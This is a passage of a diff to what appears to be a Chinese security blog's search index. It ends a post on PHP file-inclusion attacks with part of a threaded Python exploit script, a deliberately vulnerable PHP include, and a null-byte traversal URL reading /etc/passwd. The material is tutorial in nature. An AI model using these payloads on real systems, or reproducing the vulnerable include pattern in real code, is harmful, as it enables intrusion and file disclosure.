<span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start() </span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><p><strong>%00截断</strong></p>
+<p>前提：<code>php.ini</code>中<code>magic_quotes_qpc=off</code>并且<code>PHP</code>版本&lt; 5.3.4的情况。</p>
+<p>漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它会在你访问的文件中加上 html ，但是你可以通过截断来绕过它。</p>
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
 </search>
